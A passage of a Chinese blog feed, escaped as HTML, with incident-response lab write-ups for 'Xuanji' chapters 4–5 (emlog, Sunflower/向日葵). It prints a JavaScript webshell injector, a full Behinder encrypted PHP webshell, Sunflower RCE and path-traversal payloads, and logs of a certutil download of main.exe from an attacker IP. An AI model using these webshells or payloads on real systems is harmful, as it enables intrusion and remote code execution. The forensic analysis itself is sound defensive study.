&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">content&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;?php @eval($_POST[a]); ?&amp;gt;\n&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">oldData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 点击“保存文件”按钮
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">btns&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">click&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 将isSaved设为true，表示已经完成写入操作
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">isSaved&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">insertIframe&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>代码意思很明显，利用&lt;code>iframe&lt;/code>插入webshell，运行&lt;code>md5sum poc1.js&lt;/code>，&lt;code>flag{10c18029294fdec7b6ddab76d9367c14}&lt;/code>&lt;/p>
&lt;h3 id="flag4-2">flag4
&lt;/h3>&lt;p>找攻击入口，我觉得要去看看流量包了，使用过滤器&lt;code>http contains &amp;quot;poc1.js&amp;quot;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-152457.jpg"
width="879"
height="798"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-152457_hu_6405f29142954cdd.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-152457_hu_b3b7fafa8b3aa90c.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="110"
data-flex-basis="264px"
>&lt;/p>
&lt;p>发现在Cookie里面利用&lt;code>script&lt;/code>标签加载&lt;code>poc1.js&lt;/code>进行利用，&lt;code>flag{/index.php/archives/1/}&lt;/code>&lt;/p></description></item><item><title>玄机第四章</title><link>https://baozongwi.xyz/p/xuanji-chapter-4/</link><pubDate>Mon, 07 Apr 2025 17:56:28 +0000</pubDate><guid>https://baozongwi.xyz/p/xuanji-chapter-4/</guid><description>&lt;p>闲着没有事，做做玄机吧&lt;/p>
&lt;h2 id="第四章-windows实战-emlog">第四章 windows实战-emlog
&lt;/h2>&lt;p>首先看到步骤说什么RDP啥啥的，我连RDP是什么都不知道，一搜原来是远程桌面链接啊，这个我知道，那直接在搜索框里面&lt;code>远程桌面&lt;/code>，第一个就是打开之后可以进行靶机的链接&lt;/p>
&lt;h3 id="flag1">flag1
&lt;/h3>&lt;p>进来之后发现有个phpstudy，这个是可以起网站的，我们直接把www目录打包带走，然后放D盾里面梭哈一下，本来想偷懒的，因为看到有一个www.zip了，但是后来试了之后发现还是要自己拖出来，不能用他有的压缩文件&lt;/p>
&lt;p>&lt;code>\WWW\WWW\content\plugins\tips\shell.php&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">error_reporting&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">session_start&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;e45e329feb5d925b&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;k&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">session_write_close&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$post&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">file_get_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;php://input&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">extension_loaded&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;openssl&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$t&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;base64_&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;decode&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$post&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$post&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$post&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$post&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$post&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$post&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">openssl_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$post&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;AES128&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$arr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">explode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;|&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$post&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$func&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$arr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$params&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$arr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">class&lt;/span> &lt;span class="nc">C&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="fm">__invoke&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$p&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">);}}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">@&lt;/span>&lt;span class="nx">call_user_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="nv">$params&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>flag{rebeyond}&lt;/code>&lt;/p>
&lt;h3 id="flag2">flag2
&lt;/h3>&lt;p>寻找攻击成功的IP，直接查看日志，寻找&lt;code>shell.php&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-181609.jpg"
width="1506"
height="1037"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-181609_hu_e2458c14fb440227.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-181609_hu_7d2aeb5a958df45b.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="145"
data-flex-basis="348px"
>&lt;/p>
&lt;p>找到IP，&lt;code>flag{192.168.126.1}&lt;/code>&lt;/p>
&lt;h3 id="flag3">flag3
&lt;/h3>&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-181748.jpg"
width="1528"
height="1093"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-181748_hu_1fc4768b69758dcf.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-181748_hu_7a60b5eb3dd8cad7.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="139"
data-flex-basis="335px"
>&lt;/p>
&lt;p>&lt;code>flag{hacker138}&lt;/code>&lt;/p>
&lt;h3 id="flag4">flag4
&lt;/h3>&lt;p>在黑客用户的桌面发现了&lt;code>Kuang&lt;/code>文件，搞出来之后发现是个exe文件，肯定是看不了的，先下载一个工具，&lt;a class="link" href="https://github.com/extremecoders-re/pyinstxtractor" target="_blank" rel="noopener"
>pyinstxtractor&lt;/a>下载好了之后，把文件放在同一目录下，运行&lt;code>python pyinstxtractor.py Kuang.exe&lt;/code>，找到一个&lt;code>Kuang.pyc&lt;/code>，放到010搜索就可以了&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-182742.jpg"
width="1877"
height="1010"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-182742_hu_e5d147fc23c2c845.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-182742_hu_ec647eaaceabcd38.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="446px"
>&lt;/p>
&lt;p>&lt;code>flag{wakuang.zhigongshanfang.top}&lt;/code>，但是为什么这是PY编译的文件呢，原因很简单，&lt;/p>
&lt;p>首先查看文件头是不是&lt;code>MZ&lt;/code>，然后进行第二步&lt;/p>
&lt;ol>
&lt;li>&lt;strong>搜索 &lt;code>PyInstaller&lt;/code>&lt;/strong>
&lt;ul>
&lt;li>按 &lt;code>Ctrl+F&lt;/code> → 选择 &lt;strong>文本搜索&lt;/strong> → 输入 &lt;code>PyInstaller&lt;/code>&lt;/li>
&lt;li>如果找到，说明是 PyInstaller 打包的。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>搜索 &lt;code>PYZ&lt;/code>（PyInstaller 的压缩包标记）&lt;/strong>
&lt;ul>
&lt;li>同样搜索 &lt;code>PYZ&lt;/code>，如果能找到，说明是 Python 打包的。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>搜索 &lt;code>python&lt;/code> 或 &lt;code>.pyc&lt;/code>&lt;/strong>
&lt;ul>
&lt;li>搜索 &lt;code>python&lt;/code> 或 &lt;code>.pyc&lt;/code>，可能会发现 Python 运行时相关字符串。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="第四章-windows实战-向日葵">第四章 windows实战-向日葵
&lt;/h2>&lt;p>向日葵一个远程的软件，还是本地RDP，我们首先查查向日葵的RCE知道是可以进行&lt;/p>
&lt;p>目录遍历攻击：尝试访问和下载敏感文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令注入攻击：通过 URL 参数执行系统命令。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="flag1-1">flag1
&lt;/h3>&lt;p>那就很好在日志里面找了，日志我们从最早的开始看，当然找不到就要接着找&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-184342.jpg"
width="1550"
height="1149"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-184342_hu_47025e48207b0436.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-184342_hu_b2b667ef40d93c2e.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="323px"
>&lt;/p>
&lt;p>并且可以看到确实是利用的这个RCE&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-184538.jpg"
width="1923"
height="965"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-184538_hu_7aa735928ef0cf9f.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-184538_hu_79e839291da6333d.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="199"
data-flex-basis="478px"
>&lt;/p>
&lt;p>直接找执行命令whoami，找到是&lt;code>2024-03-26 10:16:25.585&lt;/code>，包起来就好了&lt;/p>
&lt;h3 id="flag2-1">flag2
&lt;/h3>&lt;p>找IP，就在同一行&lt;code>flag{192.168.31.45}&lt;/code>&lt;/p>
&lt;h3 id="flag3-1">flag3
&lt;/h3>&lt;p>同一个日志里面找了找&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">2024-03-26 10:31:07.576 - Info - [service][TcpAcceptor] new acceptor 192.168.31.45:49329--&amp;gt;192.168.31.114:49724
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-03-26 10:31:07.576 - Info - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49329, path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmain.exe, version: HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-03-26 10:31:07.576 - Info - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49329,/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmain.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>看着像是利用powershell进行反弹shell，直接交&lt;code>flag{192.168.31.249}&lt;/code>&lt;/p>
&lt;h3 id="flag4-1">flag4
&lt;/h3>&lt;p>找到这个&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">2024-03-26 10:39:11.031 - Info - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884, path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+echo+647224830+%3E+qq.txt, version: HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-03-26 10:39:11.031 - Info - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884,/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+echo+647224830+%3E+qq.txt, plugin:check, session:ciiHpsOHS1UtC5ZfZMrA1gApw9htv8ph
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>加QQ群得到文件，进行md5提交即可，Windows命令是&lt;code> certutil -hashfile .\DEC.pem MD5&lt;/code>，Linux是&lt;code>md5sum DEC.pem&lt;/code>，得到&lt;code>flag{5ad8d202f80202f6d31e077fc9b0fc6b}&lt;/code>&lt;/p>
&lt;h3 id="flag5">flag5
&lt;/h3>&lt;p>桌面加密文件内容如下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">onEDpnamFbekYxixEQ30W6ZcEXjCUrKHP+APxzuJQZD8bS+4V5Tu+7XmxT24EuNSfoGnda+obAmy2d1E2WT/0MmT4VHNIUyX15JuOcd477c7Zj5v3qtzoJk8Rmtub9RL0vDDjwYKPzyS4wxSyqhRfggenLiSFxhrY32nnf42W30=
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Your files have been encrypted
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X6cNmnKCuxdTl+f5XLhmYY4oFovJGebCmpP94be/VVqNQe0cLJm3RtX84MO98b8fI0zY50xC4OjK5aHOz2zFxCvxHygFR+rIgL0XC2rruzCAukTLJqjjbNRH06alTMMdrxhRVdrC73PMBQBweyProof4ZYNZ4YHnZrej6Vq/Ipr2xeUqamHkysjFPNqA8DVDuXYYlTUuDzZdPZpWM3IDbUDMNi4ilrPEe47IXAxd8nrqTHgX+3X7YiOjuayqK8li2c2xMXoXuSce+rAeNsWHv9SUEqUTP+MJHll7MGYLZSvYpkCVacP3joKJoI/bfoVRX8FlCuCMkicFnTawY0ZxKiX7f+0Wv+KYP0st5SYjWhMWklNSEEG7TH24wZeCANjf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Your files have been encrypted
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>还有上一题的&lt;code>DEC.pem&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">-----BEGIN RSA Private key-----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv
